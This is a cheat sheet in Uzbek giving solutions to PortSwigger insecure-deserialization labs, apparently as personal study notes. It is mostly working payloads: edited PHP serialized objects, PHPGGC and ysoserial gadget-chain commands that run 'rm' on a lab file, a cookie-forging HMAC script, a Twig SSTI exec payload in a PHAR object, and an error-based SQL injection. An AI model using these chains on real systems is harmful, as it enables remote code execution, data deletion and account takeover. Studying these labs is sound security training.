# Insecure Deserialization — PortSwigger LAB yechimlari (cheat sheet)

> Lab host = **example.com**. Session cookie odatda serialized obyekt (URL+Base64).
> Burp Inspector cookie'ni decode qiladi. Nishon: admin bo'lish yoki `/home/carlos/morale.txt` o'chirish.

---

## PHP — qo'lda tahrir

### Modifying serialized objects — APPRENTICE
`admin` atributini false → true.
```
admin b:0  →  b:1
```
> Inspector o'zi re-encode qiladi → `/admin/delete?username=carlos`.

### Modifying serialized data types (type juggling) — PRACTITIONER
PHP 7.x `==` quirk: `"0" == <string>` → access token'ni int 0 qil, username'ni administrator.
```
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```
> `s:13` uzunlik va `s`→`i` tip o'zgarishiga e'tibor ber.

### Using application functionality (avatar delete) — PRACTITIONER
`avatar_link`ni carlos faylga qaratib, account delete'ni ishga tushirasan.
```
s:11:"avatar_link";s:23:"/home/carlos/morale.txt"
```
> `POST /my-account/delete` → o'z akkauntingni + carlos faylini o'chiradi.

### Arbitrary object injection (__destruct) — PRACTITIONER
`CustomTemplate::__destruct()` → `unlink(lock_file_path)`. Source: `/libs/CustomTemplate.php~`.
```
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```
> Base64+URL-encode → cookie'ga qo'y.

---

## Gadget chains (RCE)

### PHP pre-built chain (PHPGGC + Symfony) — PRACTITIONER
Cookie SHA-1 HMAC bilan imzolangan. Error Symfony 4.3.6 ni ochadi. `/cgi-bin/phpinfo.php` da SECRET_KEY.
```bash
./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
```
```php
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

### Java pre-built chain (ysoserial + Commons) — PRACTITIONER
```bash
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```
Java 16+ uchun `--add-opens` flaglari kerak:
```bash
java --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
--add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED \
-jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```
> Natijani cookie'ga qo'y → butun qiymatni URL-encode.

### Ruby documented chain — PRACTITIONER
Cookie marshaled Ruby obyekt. `vakzz` ning "Universal Deserialisation Gadget for Ruby 2.x-3.x"
(devcraft.io). Script'da command'ni `rm /home/carlos/morale.txt` qil, oxirini
`puts Base64.encode64(payload)` qil → cookie'ga qo'y + URL-encode.

### PHAR deserialization (phar:// + Twig SSTI) — PRACTITIONER
`file_exists()` `phar://` path'da deserialize qiladi. Source: `/cgi-bin/*.php~`.
```php
class CustomTemplate {} class Blog {}
$object = new CustomTemplate;
$blog = new Blog;
$blog->desc = '{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("rm /home/carlos/morale.txt")}}';
$blog->user = 'user';
$object->template_file_path = $blog;
```
> PHAR-JPG polyglot yasab avatar qilib yukla → `GET /cgi-bin/avatar.php?avatar=phar://wiener`.

---

## Custom gadget chains

### Custom Java chain (ProductTemplate → SQLi) — EXPERT
Source: `/backup/AccessTokenUser.java`, `/backup/ProductTemplate.java`. `readObject()` `id` ni
SQL'ga qo'yadi → error-based SQLi.
```sql
' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--
```
> `id` ni apostrof qilib SQLi tasdiqla → admin parolni error'da chiqar → admin login → carlos delete.

### Custom PHP chain (__wakeup → DefaultMap::__get → exec) — EXPERT
Source: `/cgi-bin/libs/CustomTemplate.php~`. `__wakeup()` `Product` yaratadi → yo'q atribut
`DefaultMap::__get()` → `call_user_func(callback)`.
```
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}
```
> Base64+URL-encode → cookie.

---

### Eslatma
Ketma-ketlik: serialized data topish → qo'lda tahrir (tez g'alaba) → source leak → gadget chain → RCE.
PHP `__wakeup/__destruct`, Java `readObject`, magic byte: PHP `O:`, Java `ac ed 00 05` / base64 `rO0`.
Himoya: user input'ni deserialize qilma, imzola, allowlist. Umumiy: bu papka README.
